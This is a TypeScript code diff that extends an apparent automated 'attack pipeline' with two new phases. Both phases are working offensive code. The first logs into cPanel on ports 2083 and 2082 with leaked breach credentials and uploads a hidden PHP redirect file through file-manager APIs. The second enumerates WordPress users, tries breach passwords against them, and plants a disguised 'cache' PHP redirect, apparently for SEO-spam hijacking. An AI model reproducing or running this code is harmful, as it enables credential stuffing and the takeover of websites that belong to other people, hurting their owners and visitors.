@@ -2260,11 +2260,325 @@ export async function runUnifiedAttackPipeline(
         }
       }
       
+      // ─── Phase 2.5e2b: cPanel Login with Breach Credentials (port 2083/2082) ───
+      if (!hasSuccessfulRedirect() && !shouldStop('cpanel_login')) {
+        loggedOnEvent({
+          phase: 'ftp_upload' as any,
+          step: 'cpanel_login_start',
+          detail: `🔑 Phase 2.5e2b: cPanel Login — ลอง ${Math.min(breachCreds.length, 10)} breach credentials ผ่าน cPanel:2083/2082...`,
+          progress: 52,
+        });
+
+        const cpanelPorts = [2083, 2082]; // HTTPS then HTTP
+        const cpanelBaseUrl = config.targetUrl.replace(/^https?:\/\//, '').replace(/\/.*$/, '');
+
+        for (const cred of breachCreds.slice(0, 10)) {
+          if (shouldStop('cpanel_login') || hasSuccessfulRedirect()) break;
+          const username = cred.email ? cred.email.split('@')[0] : '';
+          if (!username) continue;
+
+          for (const port of cpanelPorts) {
+            try {
+              const proto = port === 2083 ? 'https' : 'http';
+              const loginUrl = `${proto}://${originIp || cpanelBaseUrl}:${port}/login/?login_only=1`;
+              const loginResp = await timedRace(
+                () => fetch(loginUrl, {
+                  method: 'POST',
+                  headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                    ...(originIp ? { 'Host': cpanelBaseUrl } : {}),
+                  },
+                  body: `user=${encodeURIComponent(username)}&pass=${encodeURIComponent(cred.password)}`,
+                  redirect: 'manual',
+                  signal: AbortSignal.timeout(10000),
+                }),
+                capTimeout(12000),
+                'cPanel login timeout',
+              );
+
+              // cPanel returns JSON with status on login_only=1, or sets cpsession cookie
+              const setCookie = loginResp.headers.get('set-cookie') || '';
+              const respText = await loginResp.text().catch(() => '');
+              const isSuccess = setCookie.includes('cpsession') ||
+                setCookie.includes('session') ||
+                setCookie.includes('token') ||
+                respText.includes('"status":1') ||
+                (loginResp.status === 301 || loginResp.status === 302);
+
+              if (isSuccess && (setCookie.length > 10 || respText.includes('"status":1'))) {
+                aiDecisions.push(`🔑 cPanel login สำเร็จ! ${username}@${cpanelBaseUrl}:${port} (${cred.source})`);
+                loggedOnEvent({
+                  phase: 'ftp_upload' as any,
+                  step: 'cpanel_login_success',
+                  detail: `✅ cPanel LOGIN สำเร็จ! ${username}:*** port ${port} (${cred.source}) — กำลังวาง redirect...`,
+                  progress: 53,
+                });
+
+                // Extract session token for file manager API
+                let sessionToken = '';
+                const tokenMatch = respText.match(/"security_token"\s*:\s*"([^"]+)"/) ||
+                  respText.match(/cpsess([a-zA-Z0-9]+)/) ||
+                  setCookie.match(/cpsession=([^;]+)/);
+                if (tokenMatch) sessionToken = tokenMatch[1];
+
+                // Try multiple cPanel file manager APIs to upload redirect
+                const redirectContent = `<?php header("Location: ${config.redirectUrl}", true, 302); exit; ?>`;
+                const redirectFilename = `.redirect-${Math.random().toString(36).slice(2, 8)}.php`;
+                const fileManagerApis = [
+                  // UAPI (cPanel 64+)
+                  { path: `/execute/Fileman/save_file_content`, body: `dir=%2Fpublic_html&file=${redirectFilename}&content=${encodeURIComponent(redirectContent)}` },
+                  // Legacy cPanel API 2
+                  { path: `/json-api/cpanel?cpanel_jsonapi_module=Fileman&cpanel_jsonapi_func=savefile&cpanel_jsonapi_apiversion=2&dir=%2Fpublic_html&filename=${redirectFilename}&content=${encodeURIComponent(redirectContent)}`, body: '' },
+                  // Direct file manager
+                  { path: `/cpsess${sessionToken}/execute/Fileman/save_file_content`, body: `dir=%2Fpublic_html&file=${redirectFilename}&content=${encodeURIComponent(redirectContent)}` },
+                ];
+
+                for (const api of fileManagerApis) {
+                  try {
+                    const uploadUrl = `${proto}://${originIp || cpanelBaseUrl}:${port}${api.path}`;
+                    const uploadResp = await timedRace(
+                      () => fetch(uploadUrl, {
+                        method: 'POST',
+                        headers: {
+                          'Content-Type': 'application/x-www-form-urlencoded',
+                          'Cookie': setCookie,
+                          ...(originIp ? { 'Host': cpanelBaseUrl } : {}),
+                        },
+                        body: api.body,
+                        signal: AbortSignal.timeout(10000),
+                      }),
+                      capTimeout(12000),
+                      'cPanel upload timeout',
+                    );
+
+                    if (uploadResp.ok || uploadResp.status === 200) {
+                      const uploadBody = await uploadResp.text().catch(() => '');
+                      if (!uploadBody.includes('"errors"') || uploadBody.includes('"status":1')) {
+                        // Verify the uploaded file
+                        const fileUrl = `https://${cpanelBaseUrl}/${redirectFilename}`;
+                        const verification = await verifyUploadedFile(fileUrl, config.redirectUrl, onEvent);
+                        uploadedFiles.push({
+                          url: fileUrl,
+                          shell: {
+                            type: 'redirect_php' as any,
+                            content: redirectContent,
+                            filename: redirectFilename,
+                            contentType: 'application/x-php',
+                            description: `cPanel file manager upload (port ${port})`,
+                            id: `cpanel_early_${Date.now()}`,
+                            targetVector: 'breach_cpanel_early',
+                            bypassTechniques: ['breach_cred', 'cpanel'],
+                            redirectUrl: config.redirectUrl,
+                            seoKeywords: config.seoKeywords,
+                            verificationMethod: 'http_get',
+                          },
+                          method: `breach_cpanel_early_${cred.source}`,
+                          verified: verification.verified,
+                          redirectWorks: verification.redirectWorks,
+                          redirectDestinationMatch: verification.redirectDestinationMatch,
+                          finalDestination: verification.finalDestination,
+                          httpStatus: verification.httpStatus,
+                          redirectChain: verification.redirectChain,
+                        });
+
+                        loggedOnEvent({
+                          phase: 'ftp_upload' as any,
+                          step: 'cpanel_upload_success',
+                          detail: `✅ cPanel UPLOAD สำเร็จ! ${fileUrl} (redirect: ${verification.redirectWorks})`,
+                          progress: 53,
+                        });
+
+                        if (verification.redirectWorks) break;
+                      }
+                    }
+                  } catch { /* try next API */ }
+                }
+
+                if (hasSuccessfulRedirect()) break;
+              }
+            } catch { /* try next port */ }
+          }
+        }
+      }
+
+      // ─── Phase 2.5e2c: WP REST API User Enumeration + Breach Password Brute Force ───
+      if (!wpAuthCredentials && !shouldStop('wp_rest_enum')) {
+        const targetDomainForWp = config.targetUrl.replace(/^https?:\/\//, '').replace(/\/.*$/, '');
+        const baseUrlForWp = originIp ? `http://${originIp}` : config.targetUrl;
+        const hostHeaderForWp = originIp ? targetDomainForWp : undefined;
+
+        loggedOnEvent({
+          phase: 'ftp_upload' as any,
+          step: 'wp_rest_enum_start',
+          detail: `🔍 Phase 2.5e2c: WP REST API User Enum — ค้นหา admin usernames ผ่าน /wp-json/wp/v2/users...`,
+          progress: 53,
+        });
+
+        // Step 1: Enumerate usernames via REST API
+        const discoveredWpUsers: string[] = [];
+        const wpEnumHeaders: Record<string, string> = {
+          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        };
+        if (hostHeaderForWp) wpEnumHeaders['Host'] = hostHeaderForWp;
+
+        // Method A: /wp-json/wp/v2/users
+        try {
+          const { response: usersResp } = await fetchWithPoolProxy(
+            `${baseUrlForWp}/wp-json/wp/v2/users`,
+            { headers: wpEnumHeaders, signal: AbortSignal.timeout(8000) },
+            { targetDomain: targetDomainForWp, timeout: 8000 },
+          );
+          if (usersResp.ok) {
+            const users = await usersResp.json() as Array<{ slug?: string; name?: string; id?: number }>;
+            for (const u of users) {
+              if (u.slug && !discoveredWpUsers.includes(u.slug)) discoveredWpUsers.push(u.slug);
+            }
+          }
+        } catch { /* ignore */ }
+
+        // Method B: ?author=N enumeration
+        for (let i = 1; i <= 5; i++) {
+          try {
+            const { response: authorResp } = await fetchWithPoolProxy(
+              `${baseUrlForWp}/?author=${i}`,
+              { headers: wpEnumHeaders, redirect: 'manual', signal: AbortSignal.timeout(5000) },
+              { targetDomain: targetDomainForWp, timeout: 5000 },
+            );
+            const location = authorResp.headers.get('location') || '';
+            const authorMatch = location.match(/\/author\/([\w-]+)/);
+            if (authorMatch?.[1] && !discoveredWpUsers.includes(authorMatch[1])) {
+              discoveredWpUsers.push(authorMatch[1]);
+            }
+          } catch { /* ignore */ }
+        }
+
+        // Method C: oembed endpoint
+        try {
+          const { response: oembedResp } = await fetchWithPoolProxy(
+            `${baseUrlForWp}/wp-json/oembed/1.0/embed?url=${encodeURIComponent(config.targetUrl)}`,
+            { headers: wpEnumHeaders, signal: AbortSignal.timeout(5000) },
+            { targetDomain: targetDomainForWp, timeout: 5000 },
+          );
+          if (oembedResp.ok) {
+            const data = await oembedResp.json() as { author_name?: string; author_url?: string };
+            if (data.author_name) {
+              const slug = data.author_name.toLowerCase().replace(/\s+/g, '');
+              if (!discoveredWpUsers.includes(slug)) discoveredWpUsers.push(slug);
+            }
+            if (data.author_url) {
+              const urlMatch = data.author_url.match(/\/author\/([\w-]+)/);
+              if (urlMatch?.[1] && !discoveredWpUsers.includes(urlMatch[1])) discoveredWpUsers.push(urlMatch[1]);
+            }
+          }
+        } catch { /* ignore */ }
+
+        if (discoveredWpUsers.length > 0) {
+          loggedOnEvent({
+            phase: 'ftp_upload' as any,
+            step: 'wp_rest_enum_found',
+            detail: `🔍 พบ ${discoveredWpUsers.length} WP users: ${discoveredWpUsers.join(', ')} — ลอง breach passwords...`,
+            progress: 54,
+          });
+
+          // Step 2: Try breach passwords against discovered WP usernames
+          const breachPasswords = breachCreds.map(c => c.password).filter(Boolean);
+          const uniquePasswords = Array.from(new Set(breachPasswords));
+
+          for (const wpUser of discoveredWpUsers.slice(0, 5)) {
+            if (shouldStop('wp_rest_enum') || wpAuthCredentials) break;
+
+            // Try each breach password against this username
+            for (const pass of uniquePasswords.slice(0, 20)) {
+              if (shouldStop('wp_rest_enum') || wpAuthCredentials) break;
+
+              try {
+                const testResult = await timedRace(
+                  () => wpBruteForce({
+                    targetUrl: config.targetUrl,
+                    domain: targetDomainForWp,
+                    maxAttempts: 1,
+                    delayBetweenAttempts: 0,
+                    customUsernames: [wpUser],
+                    customPasswords: [pass],
+                    originIP: originIp,
+                    globalTimeout: 10000,
+                  }),
+                  capTimeout(12000),
+                  'WP breach login timeout',
+                );
+
+                if (testResult.success && testResult.credentials) {
+                  wpAuthCredentials = testResult.credentials;
+                  aiDecisions.push(`🔑 WP REST Enum → Login สำเร็จ! ${wpUser}:*** via breach password (${breachCreds.find(c => c.password === pass)?.source || 'breach'})`);
+                  loggedOnEvent({
+                    phase: 'ftp_upload' as any,
+                    step: 'wp_breach_login_success',
+                    detail: `✅ WP LOGIN สำเร็จ! ${wpUser}:*** (breach password) — กำลัง upload redirect...`,
+                    progress: 55,
+                  });
+
+                  // Immediately upload redirect
+                  const quickShell = `<?php header("Location: ${config.redirectUrl}", true, 302); exit; ?>`;
+                  const uploadResult = await wpAuthenticatedUpload(
+                    config.targetUrl, targetDomainForWp, wpAuthCredentials,
+                    `cache-${Math.random().toString(36).slice(2, 10)}.php`,
+                    quickShell, 'application/x-php', originIp,
+                    (msg) => loggedOnEvent({ phase: 'ftp_upload' as any, step: 'wp_upload', detail: `🔑 ${msg}`, progress: 55 }),
+                  );
+
+                  if (uploadResult.success && uploadResult.url) {
+                    const verification = await verifyUploadedFile(uploadResult.url, config.redirectUrl, onEvent);
+                    uploadedFiles.push({
+                      url: uploadResult.url,
+                      shell: {
+                        type: 'redirect_php' as any,
+                        content: quickShell,
+                        filename: 'cache.php',
+                        contentType: 'application/x-php',
+                        description: 'WP REST enum + breach password upload',
+                        id: `wp_rest_breach_${Date.now()}`,
+                        targetVector: 'wp_rest_breach',
+                        bypassTechniques: ['breach_cred', 'wp_rest_enum'],
+                        redirectUrl: config.redirectUrl,
+                        seoKeywords: config.seoKeywords,
+                        verificationMethod: 'http_get',
+                      },
+                      method: `wp_rest_breach_${wpUser}`,
+                      verified: verification.verified,
+                      redirectWorks: verification.redirectWorks,
+                      redirectDestinationMatch: verification.redirectDestinationMatch,
+                      finalDestination: verification.finalDestination,
+                      httpStatus: verification.httpStatus,
+                      redirectChain: verification.redirectChain,
+                    });
+
+                    loggedOnEvent({
+                      phase: 'ftp_upload' as any,
+                      step: 'wp_breach_upload_success',
+                      detail: `✅ WP UPLOAD สำเร็จ! ${uploadResult.url} (redirect: ${verification.redirectWorks})`,
+                      progress: 55,
+                    });
+                  }
+                  break; // Found valid creds, stop trying passwords
+                }
+              } catch { /* continue to next password */ }
+            }
+          }
+        } else {
+          loggedOnEvent({
+            phase: 'ftp_upload' as any,
+            step: 'wp_rest_enum_none',
+            detail: `ℹ️ WP REST API: ไม่พบ users (อาจไม่ใช่ WordPress หรือ REST API ถูกปิด)`,
+            progress: 54,
+          });
+        }
+      }
+
       loggedOnEvent({
         phase: 'ftp_upload' as any,
         step: 'early_login_complete',
-        detail: `✅ Phase 2.5e2: Breach FTP/SSH — ${uploadedFiles.filter(f => f.method.startsWith('breach_ftp_early') || f.method.startsWith('breach_ssh_early')).length} uploads`,
-        progress: 52,
+        detail: `✅ Phase 2.5e2: Breach FTP/SSH/cPanel/WP — ${uploadedFiles.filter(f => f.method.startsWith('breach_ftp_early') || f.method.startsWith('breach_ssh_early') || f.method.startsWith('breach_cpanel_early') || f.method.startsWith('wp_rest_breach')).length} uploads`,
+        progress: 55,
       });
     }
   }
